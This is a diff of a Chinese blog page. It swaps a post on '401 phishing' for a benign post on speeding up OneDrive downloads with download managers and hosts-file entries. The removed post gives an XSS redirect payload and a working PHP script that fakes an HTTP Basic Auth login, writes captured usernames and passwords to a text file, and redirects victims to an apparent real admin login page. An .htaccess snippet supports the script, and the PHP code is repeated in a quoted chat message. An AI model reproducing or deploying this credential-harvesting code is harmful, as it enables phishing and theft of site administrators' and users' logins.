@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="401钓鱼, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="配合URL跳转的一次401钓鱼实践笔记。">
+    <meta name="keywords" content="OneDrive国内提速方案, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="OneDrive本身不限速，但是由于服务器在国外。导致国内速度不理想。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>401钓鱼 | 偏锋小白菜</title>
+    <title>OneDrive国内提速方案 | 偏锋小白菜</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218021317.jfif')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">401钓鱼</h1>
+                    <h1 class="description center-align post-title">OneDrive国内提速方案</h1>
                 </div>
             </div>
         </div>
@@ -365,23 +365,14 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                <span class="chip bg-color">网络安全</span>
+                            <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                                <span class="chip bg-color">计算机</span>
                             </a>
                         
                     </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                网络安全
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -390,28 +381,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-13
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-25
+                    2020-03-30
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    546
+                    710
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    3 分
                 </div>
                 
 				
@@ -427,50 +418,103 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="一、XSS-URL-跳转"><a href="#一、XSS-URL-跳转" class="headerlink" title="一、XSS URL 跳转"></a>一、XSS URL 跳转</h3><p>测试账号：13140000000<br>JS跳转代码：</p>
-<pre><code>&lt;script language="JavaScript" type="text/javascript"&gt;window.location.href='YOU URL'; &lt;/script&gt;</code></pre><p>当我们将其插入到有XSS漏洞的地方，网页会立马跳转到我们的网页</p>
-<p>那么如何去掉反弹，让网页不在跳转到其它页面呢？？</p>
-<p>首先开启BURP抓包，然后进入含有我们插入XSS URL恶意跳转的页面，进行抓包拦截；单击右键-Do intercept-response to this request （抓取返回包） 接着点击 放过 ；等待BURP抓取返回包（服务器传输给客户端的数据包）在返回包里找到我们那段代码将其删除，这样网页就不会跳转了；最后在最初我们插入XSS跳转代码的地方，将这段恶意代码彻底的删除。这样就OK了。</p>
-<p><strong>图文过程：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115758.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115759.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115800.png" alt=""></p>
-<p><strong>去掉反弹跳转过程</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115801.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115804.png" alt=""></p>
-<p>响应包：</p>
-<p>思路：在响应包里找到我们插入的恶意代码，将其删除，并且放过数据包。从而不让客户端跳转到其他页面。进而回到客户端添加代码的地方，将其永久删除。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115805.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115802.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218115803.png" alt=""></p>
-<p>完成。</p>
-<h3 id="二、401登录认证钓鱼"><a href="#二、401登录认证钓鱼" class="headerlink" title="二、401登录认证钓鱼"></a>二、401登录认证钓鱼</h3><p>首先代码：保存为1.php</p>
-<pre><code>
-&lt;?php
-
-if(!isset($_SERVER['PHP_AUTH_USER']) &amp;&amp; !isset($_SERVER['PHP_AUTH_PW'])) {
-    Header("WWW-Authenticate: Basic realm=\"USER LOGIN\"");
-    Header("HTTP/1.0 401 Unauthorized");
-} else {
-    @file_put_contents('./b4dboy.txt', $_SERVER['PHP_AUTH_USER'].'|'.$_SERVER['PHP_AUTH_PW']."\r\n", FILE_APPEND);
-    header("Location: http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login");
-}
-
-?&gt;
-开启401</code></pre><p>接着创建文件 .htaccess 写入内容</p>
-<pre><code>Options +FollowSymlinks -Multiviews
-RewriteEngine On
-#Authorization Headers
-RewriteCond %{HTTP:Authorization} ^(.+)$
-RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><blockquote>
-<p>@全体成员 昨晚关于401钓鱼不成功。</p>
-<p>首先代码：保存为1.php<br>&lt;?php</p>
-<p>if(!isset($_SERVER[‘PHP_AUTH_USER’]) &amp;&amp; !isset($_SERVER[‘PHP_AUTH_PW’])) {<br>    Header(“WWW-Authenticate: Basic realm="USER LOGIN"“);<br>    Header(“HTTP/1.0 401 Unauthorized”);<br>} else {<br>    @file_put_contents(‘./b4dboy.txt’, $_SERVER[‘PHP_AUTH_USER’].’|’.$_SERVER[‘PHP_AUTH_PW’].”\r\n”, FILE_APPEND);<br>    header(“Location: <a href="http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login&quot;" target="_blank" rel="noopener">http://xm013.nanguatv.xyz/index.php?g=Admin&amp;m=Index&amp;a=login"</a>);<br>}</p>
-<p>?&gt;</p>
-<p>接着创建文件 .htaccess 写入内容<br>Options +FollowSymlinks -Multiviews<br>RewriteEngine On</p>
-<p>#Authorization Headers<br>RewriteCond %{HTTP:Authorization} ^(.+)$<br>RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</p>
-<p>开启401</p>
+                <h1 id="微软网盘-OneDrive-下载提速方案"><a href="#微软网盘-OneDrive-下载提速方案" class="headerlink" title="微软网盘(OneDrive)下载提速方案"></a>微软网盘(OneDrive)下载提速方案</h1><blockquote>
+<p>测试的带宽50MB。</p>
 </blockquote>
+<h3 id="EagleGet提速"><a href="#EagleGet提速" class="headerlink" title="EagleGet提速"></a>EagleGet提速</h3><p>1)：去星愿浏览器官网下载星愿浏览器：<a href="https://www.twinkstar.com/" target="_blank" rel="noopener">https://www.twinkstar.com/</a>下载Win版本并安装。</p>
+<p>2)：去eagleget官方下载eagleget猎鹰下载器：<a href="http://www.eagleget.com/" target="_blank" rel="noopener">http://www.eagleget.com/</a>下载Win版本并安装。</p>
+<p>3)：打开星愿浏览器开启配置eagleget猎鹰下载工具，。将插件导入即可。或者安装下载器。</p>
+<ul>
+<li><p>安装下载器</p>
+</li>
+<li><p>安装插件</p>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330110317.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112131.png" alt=""></p>
+<p><strong>提示：</strong></p>
+<p>如果你用的是谷歌浏览器，可以不用下载星愿浏览器，可以在谷歌应用商店里搜索这个下载器插件，效果几乎是一样的，因为星愿浏览器采用的是Chrome内核。</p>
+<p><strong>效果：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330110316.png" alt=""></p>
+<h3 id="IDM提速"><a href="#IDM提速" class="headerlink" title="IDM提速"></a>IDM提速</h3><p>也能起到提速的作用。</p>
+<p><strong>效果：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112133.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200330112132.png" alt=""></p>
+<h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><pre><code># Onedrive通用
+13.107.42.12 d.docs.live.net
+13.107.42.12 docs.live.net
+
+# Onedrive客户端
+13.107.42.12 api.onedrive.com
+13.107.42.12 public.bn.files.1drv.com
+13.107.42.12 public.dm.files.1drv.com
+40.90.136.163 skydrivesync.policies.live.net
+157.55.109.230 skydrivesync.policies.live.net
+40.77.224.8 skydrivesync.policies.live.net
+104.74.21.118 oneclient.sfx.ms
+23.1.189.37 oneclient.sfx.ms
+23.56.30.148 oneclient.sfx.ms
+52.114.88.20 mobile.pipe.aria.microsoft.com
+52.114.132.73 mobile.pipe.aria.microsoft.com
+52.114.77.33 mobile.pipe.aria.microsoft.com
+40.90.136.166 storage.live.com
+157.55.109.226 storage.live.com
+40.90.136.1 storage.live.com
+52.242.211.89 skydrive.wns.windows.com
+52.139.250.253 skydrive.wns.windows.com
+40.90.189.152 skydrive.wns.windows.com
+
+# Onedrive for Business客户端
+#13.107.136.9 jia666-my.sharepoint.com
+#13.107.6.151 jia666-my.sharepoint.com
+#请将**改成自己所在域的域名,没听过的话请删除这条
+
+# Onenote UWP客户端
+52.109.132.2 contentsync.onenote.com
+52.109.48.2 contentsync.onenote.com
+52.109.44.3 contentsync.onenote.com
+52.109.48.0 www.onenote.com
+52.109.2.10 www.onenote.com
+52.109.44.1 www.onenote.com
+23.57.112.187 c1-onenote-15.cdn.office.net
+23.219.32.184 c1-onenote-15.cdn.office.net
+104.75.165.28 c1-onenote-15.cdn.office.net
+52.109.56.33 ocws.officeapps.live.com
+52.109.124.103 ocws.officeapps.live.com
+52.109.20.5 ocws.officeapps.live.com
+52.109.2.18 roaming.officeapps.live.com
+52.109.56.34 roaming.officeapps.live.com
+52.109.120.3 roaming.officeapps.live.com
+23.65.34.111 contentstorage.osi.office.net
+23.41.47.209 contentstorage.osi.office.net
+184.84.56.175 contentstorage.osi.office.net</code></pre><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><table>
+<thead>
+<tr>
+<th>下载类</th>
+<th>软件描述</th>
+<th>直通车</th>
+<th>官网</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EagleGet</td>
+<td>免费、EagleGet使用先进的多线程技术，通过将文件分成多个部分然后同时传输来加速下载，从而使下载速度提高了6倍！<strong><a href="https://www.lanzous.com/iase0xa" target="_blank" rel="noopener">插件</a></strong></td>
+<td><a href="https://www.lanzous.com/iasdwpi" target="_blank" rel="noopener">蓝走运下载</a></td>
+<td><a href="http://www.eagleget.com/" target="_blank" rel="noopener">官网</a></td>
+</tr>
+<tr>
+<td>IDM</td>
+<td>多线程下载</td>
+<td><a href="https://www.lanzous.com/b0bq9893c" target="_blank" rel="noopener">蓝奏云下载</a></td>
+<td></td>
+</tr>
+<tr>
+<td>星愿浏览器</td>
+<td>官网描述。大学生都爱用</td>
+<td><a href="https://www.lanzous.com/iase0qd" target="_blank" rel="noopener">蓝走运下载</a></td>
+<td><a href="https://www.twinkstar.com/" target="_blank" rel="noopener">官网</a></td>
+</tr>
+</tbody></table>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -504,7 +548,7 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top" rel="external nofollow noreferrer">Cat00011cat</a>
+                    <a href="http://www.thecat.top" rel="external nofollow noreferrer">偏锋小白菜|Cat00011cat</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -514,7 +558,7 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/25443.html">http://www.thecat.top/posts/25443.html</a>
+                    <a href="http://www.thecat.top/posts/5633.html">http://www.thecat.top/posts/5633.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -527,7 +571,7 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="http://www.thecat.top" target="_blank">Cat00011cat</a>
+                    <a href="http://www.thecat.top" target="_blank">偏锋小白菜|Cat00011cat</a>
                     !
                 </span>
             </div>
@@ -552,8 +596,8 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">网络安全</span>
+                                <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                                    <span class="chip bg-color">计算机</span>
                                 </a>
                             
                         </div>
@@ -724,7 +768,7 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-02-13T23-31-33',
+        id: '2020-03-30T11-51-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1008,45 +1052,43 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/48769.html">
+                <a href="/posts/5633.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200218001734.jfif" class="responsive-img" alt="硬盘故障">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" class="responsive-img" alt="OneDrive国内提速方案">
                         
-                        <span class="card-title">硬盘故障</span>
+                        <span class="card-title">OneDrive国内提速方案</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            关于一次移动硬盘插入电脑可以识别设备，驱动也没问题，但是计算机不显示硬盘文件夹问题解决方案。
+                            OneDrive本身不限速，但是由于服务器在国外。导致国内速度不理想。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/IT%E6%8A%80%E6%9C%AF/" class="post-category">
-                                    IT技术
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            偏锋小白菜|Cat00011cat
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/IT%E6%8A%80%E6%9C%AF/">
-                        <span class="chip bg-color">IT技术</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                        <span class="chip bg-color">计算机</span>
                     </a>
                     
                 </div>
@@ -1060,32 +1102,28 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/30324.html">
+                <a href="/posts/8509.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209160430.jfif" class="responsive-img" alt="快速查看端口被谁占用了">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200329221858.png" class="responsive-img" alt="使用OneDrive自建网盘">
                         
-                        <span class="card-title">快速查看端口被谁占用了</span>
+                        <span class="card-title">使用OneDrive自建网盘</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            快速查看端口被XXX占用。
+                            微软网盘OneDrive申请注册5T空间容量网盘和基于OneDrive搭建私人网盘的笔记。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-13
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-29
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/IT%E6%8A%80%E6%9C%AF/" class="post-category">
-                                    IT技术
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            偏锋小白菜|Cat00011cat
                             
                         </span>
                     </div>
@@ -1093,8 +1131,8 @@ RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]</code></pre><block
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/IT%E6%8A%80%E6%9C%AF/">
-                        <span class="chip bg-color">IT技术</span>
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">
+                        <span class="chip bg-color">计算机</span>
                     </a>
                     
                 </div>
